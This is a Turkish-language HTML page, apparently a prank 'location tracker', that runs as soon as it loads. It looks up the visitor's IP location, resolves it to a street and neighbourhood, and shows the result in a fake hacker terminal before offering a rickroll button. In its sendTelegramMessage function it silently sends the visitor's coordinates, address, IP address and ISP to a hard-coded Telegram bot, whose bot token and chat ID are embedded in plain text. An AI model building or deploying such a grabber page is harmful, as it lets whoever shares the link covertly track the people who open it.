<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Konum Takip√ßisi</title>
  <style>
    html, body {
      margin: 0; 
      padding: 0; 
      width: 100%; 
      height: 100vh;
      background: black;
      color: #00ff00;
      font-family: monospace;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    #container {
      width: 95vw;
      max-width: 1200px;
      height: 95vh;
      background-color: black;
      border-radius: 8px;
      box-sizing: border-box;
      box-shadow: 0 0 20px #00ff00;
      display: flex;
      flex-direction: column;
      gap: 8px;
      position: relative;
      padding: 12px;
    }
    
    #terminal {
      flex: 1 1 50%;
      background: black;
      padding: 15px;
      overflow-y: auto;
      font-size: 14px;
      line-height: 1.4;
      white-space: pre-wrap;
      user-select: none;
      border-radius: 8px;
      border: 1px solid #00ff00;
      max-height: 45vh;
    }
    
    #map {
      flex: 1 1 50%;
      border: 2px solid #00ff00;
      border-radius: 8px;
      background: #111;
      height: 50vh;
    }
    
    #rickrollButton {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: none;
      background: #00ff00;
      color: black;
      padding: 14px 35px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      user-select: none;
      font-size: 18px;
      transition: all 0.3s ease;
      box-shadow: 0 0 15px #00ff00;
      z-index: 1000;
    }
    
    #rickrollButton:hover {
      background: #00cc00;
      box-shadow: 0 0 25px #00ff00;
      transform: translateX(-50%) scale(1.05);
    }
    
    .leaflet-container {
      background: #111 !important;
      border-radius: 6px;
    }
    
    .leaflet-popup-content-wrapper {
      background: #222 !important;
      color: #00ff00 !important;
      border-radius: 6px;
    }
    
    .leaflet-popup-tip {
      background: #222 !important;
    }
    
    .leaflet-popup-content {
      margin: 12px 16px;
      line-height: 1.5;
    }
  </style>

  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css"
  />
</head>
<body>
  <div id="container">
    <pre id="terminal"></pre>
    <div id="map"></div>
    <button id="rickrollButton">üéÅ S√ºrpriz ƒ∞√ßin Tƒ±kla</button>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const button = document.getElementById('rickrollButton');
    let map;

    function logToTerminal(text) {
      terminal.textContent += text + '\n';
      terminal.scrollTop = terminal.scrollHeight;
    }

    function getCurrentTime() {
      return new Date().toLocaleString('tr-TR');
    }

    function decToDMS(deg) {
      const absolute = Math.abs(deg);
      const degrees = Math.floor(absolute);
      const minutes = ((absolute - degrees) * 60).toFixed(1);
      return { degrees, minutes };
    }

    function formatCoordinate(lat, lon) {
      const latDMS = decToDMS(lat);
      const lonDMS = decToDMS(lon);
      const latCardinal = lat >= 0 ? "Kuzey" : "G√ºney";
      const lonCardinal = lon >= 0 ? "Doƒüu" : "Batƒ±";

      return `${latDMS.degrees}¬∞${latDMS.minutes}' ${latCardinal}, ${lonDMS.degrees}¬∞${lonDMS.minutes}' ${lonCardinal}`;
    }

    async function getLocationData() {
      try {
        logToTerminal(`[${getCurrentTime()}] IP tabanlƒ± konum alƒ±nƒ±yor...`);
        
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        if (data.error) {
          throw new Error('IP tabanlƒ± konum alƒ±namadƒ±');
        }

        return {
          latitude: data.latitude,
          longitude: data.longitude,
          city: data.city || 'Bilinmiyor',
          region: data.region || 'Bilinmiyor',
          country: data.country_name || 'Bilinmiyor',
          ip: data.ip || 'Bilinmiyor',
          org: data.org || 'Bilinmiyor',
          postal: data.postal || 'Bilinmiyor',
          street: '',
          neighborhood: ''
        };
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] IP konum hatasƒ±: ${error.message}`);
        return {
          latitude: 41.0082,
          longitude: 28.9784,
          city: 'ƒ∞stanbul',
          region: 'ƒ∞stanbul',
          country: 'T√ºrkiye',
          ip: 'Tespit edilemedi',
          org: 'Bilinmiyor',
          postal: 'Bilinmiyor',
          street: '',
          neighborhood: ''
        };
      }
    }

    async function reverseGeocode(lat, lon) {
      try {
        logToTerminal(`[${getCurrentTime()}] Detaylƒ± adres bilgisi alƒ±nƒ±yor...`);

        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
        const response = await fetch(url, {
          headers: { 'User-Agent': 'KonumTakipci/1.0' }
        });
        const data = await response.json();

        const addr = data.address || {};
        return {
          street: addr.road || addr.pedestrian || addr.footway || addr.street || '',
          neighborhood: addr.suburb || addr.neighbourhood || addr.hamlet || addr.village || addr.city_district || '',
          city: addr.city || addr.town || addr.village || '',
          region: addr.state || '',
          country: addr.country || ''
        };
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] Reverse geocoding hatasƒ±: ${error.message}`);
        return { street: '', neighborhood: '', city: '', region: '', country: '' };
      }
    }

    async function sendTelegramMessage(message) {
      try {
        const chatId = '6400737507';
        const botToken = '8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
          })
        });
      } catch (error) {
        logToTerminal(`[${getCurrentTime()}] Telegram API hatasƒ±: ${error.message}`);
      }
    }

    async function collectData() {
      logToTerminal(`[${getCurrentTime()}] üöÄ Sistem ba≈ülatƒ±lƒ±yor...`);
      logToTerminal(`[${getCurrentTime()}] üì° Veriler toplanƒ±yor...`);

      let locationData = await getLocationData();

      const reverseData = await reverseGeocode(locationData.latitude, locationData.longitude);
      locationData.street = reverseData.street;
      locationData.neighborhood = reverseData.neighborhood;
      locationData.city = reverseData.city || locationData.city;
      locationData.region = reverseData.region || locationData.region;
      locationData.country = reverseData.country || locationData.country;

      logToTerminal(`[${getCurrentTime()}] Koordinatlar: ${locationData.latitude}, ${locationData.longitude}`);
      logToTerminal(`[${getCurrentTime()}] Koordinatlar (DMS): ${formatCoordinate(locationData.latitude, locationData.longitude)}`);
      logToTerminal(`[${getCurrentTime()}] √úlke: ${locationData.country}`);
      logToTerminal(`[${getCurrentTime()}] B√∂lge: ${locationData.region}`);
      logToTerminal(`[${getCurrentTime()}] ≈ûehir: ${locationData.city}`);
      logToTerminal(`[${getCurrentTime()}] Mahalle: ${locationData.neighborhood}`);
      logToTerminal(`[${getCurrentTime()}] Sokak: ${locationData.street}`);
      logToTerminal(`[${getCurrentTime()}] Posta Kodu: ${locationData.postal}`);
      logToTerminal(`[${getCurrentTime()}] IP Adresi: ${locationData.ip}`);
      logToTerminal(`[${getCurrentTime()}] ISP: ${locationData.org}`);

      const message = 
        `<b>üìç Yeni Konum Bilgisi</b>\n` +
        `Koordinatlar: ${locationData.latitude}, ${locationData.longitude}\n` +
        `Koordinatlar (DMS): ${formatCoordinate(locationData.latitude, locationData.longitude)}\n` +
        `√úlke: ${locationData.country}\n` +
        `B√∂lge: ${locationData.region}\n` +
        `≈ûehir: ${locationData.city}\n` +
        `Mahalle: ${locationData.neighborhood}\n` +
        `Sokak: ${locationData.street}\n` +
        `Posta Kodu: ${locationData.postal}\n` +
        `IP: ${locationData.ip}\n` +
        `ISP: ${locationData.org}`;

      await sendTelegramMessage(message);

      initializeMap(locationData.latitude, locationData.longitude);
      button.style.display = 'block';
    }

    function initializeMap(lat, lon) {
      if (map) {
        map.remove();
      }
      map = L.map('map').setView([lat, lon], 16);

      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '¬© OpenStreetMap contributors'
      }).addTo(map);

      const marker = L.marker([lat, lon]).addTo(map);
      marker.bindPopup(`Konum: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
    }

    button.addEventListener('click', () => {
      window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
    });

    collectData();
  </script>
</body>
</html>
